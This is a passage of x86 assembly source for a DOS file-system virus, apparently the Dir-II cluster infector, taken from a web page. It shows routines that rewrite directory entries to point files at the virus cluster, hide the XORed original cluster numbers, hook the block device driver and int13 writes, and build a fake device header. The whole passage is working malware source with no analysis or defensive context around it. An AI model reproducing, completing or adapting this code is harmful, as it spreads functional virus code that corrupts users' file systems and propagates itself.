        jne     on_exit
        test    dl,dl
        jnz     uninfect
        db      0b8h            ;mov ax,...
Vclust  dw      0163h
        cmp     ax,word ptr [si+1Ah]            ;cluster #
        je      on_exit                         ;already set on virus
        xchg    ax,word ptr [si+1Ah]            ;cluster #
        db      35h                     ;xor ax,...
Xmask   LABEL   word
        db      17h                     ;XOR original cluster number
Xlow    db      0FEh                    ;XOR original cluster number
        mov     word ptr [si+14h],ax            ;put in reserved space
        loop    on_exit                 ;=jmp
uninfect:
	xor	ax,ax
        xchg    ax,word ptr [si+14h]            ;XORed original cluster
        xor     ax,word ptr cs:Xmask
        mov     word ptr [si+1Ah],ax            ;cluster
on_exit:
        rol     word ptr cs:Xmask,1
        add     si,20h                          ;next dir entry
	cmp	di,si
        jne     next_dir_entry
	ret	

unit_chk:                               ;ds=es
        mov     ah,byte ptr [bx+1]      ;unit (block device) number
        db      80h,0fch                ;cmp ah,...
unit    db      0
        mov     byte ptr cs:[unit],ah
        jne     on_ret                  ;different unit
        push    word ptr [bx+0Eh]       ;save offset of DTA
        mov     byte ptr [bx+2],1       ;command code (1=media change check)
        call    old_dev_drv
        cmp     byte ptr [bx+0Eh],1
        pop     word ptr [bx+0Eh]       ;restore offset of DTA
        mov     byte ptr [bx+2],al      ;restore command code
on_ret:
        ret

virtual:
        cmp     byte ptr es:[bx+2],8    ;write
        ja      old_dev_drv
        mov     byte ptr es:[bx+2],4    ;read
        mov     si,0070h
	mov	ds,si
        db      0beh            ;mov si,...
ptr_on_dword    dw      00B4h
	push	word ptr [si]
        push    word ptr [si+2]
        mov     word ptr [si],OFFSET int13_write
        mov     word ptr [si+2],cs
        call    old_dev_drv
        pop     word ptr [si+2]
	pop	word ptr [si]
	ret	

old_1sec:
        mov     word ptr es:[bx+12h],1          ;1 sector
old_dev_drv:
        db      9ah                             ;call strategy
offs    dw      0
        dw      70h
        db      9ah                             ;call interrupt
offi    dw      0
        dw      70h
        test    byte ptr es:[bx+4],80h          ;error ?
	ret	

Xscramble:
        cmp     ax,0FF0h
        ja      gt_ff0
        mov     si,3
        xor     word ptr cs:[si+(OFFSET Xlow-3)],si     ;ofs(Xlow)-3=43dh
	mul	si
	shr	ax,1
        mov     di,0FFFh
        jnc     no_CY
	mov	di,0FFF0h
        jmp     short no_CY
gt_ff0:
        mov     si,2
	mul	si
	mov	di,0FFFFh
no_CY:
        mov     si,200h
	div	si
        inc     ax
	ret	

inf_cnt dw      0022h   ;4eb

newheader       =       $-4             ;4e9 -> inc ax, ret
        dw      0842h                   ;attribute (block,>32M,
                                        ;support logicaldevices,
                                        ;support open/close/RM) at 4ed
        dw      OFFSET Device_driver    ;024Bh at 4ef   strategy
        dw      OFFSET _retf            ;02A2h at 4f1   interrupt
        db      7Fh                     ;subunit # for block devices at 4f3
EPB:
        dw      0000h   ;4f4 - segment of environment for child
        dw      0080h
        dw      1027h   ;cs - command line
        dw      005Ch
        dw      1027h   ;cs - 1st FCB
        dw      006Ch
;       dw      0006h   ;cs - 2nd FCB
Bottom:
;+0
;+2     BPB start               ;copies original BPB here
;...
;+21h   BPB end
;+22h   ASCIIZ to start

dir_II  ends
        end     adr_100

</textarea></td></tr></table></body></html>
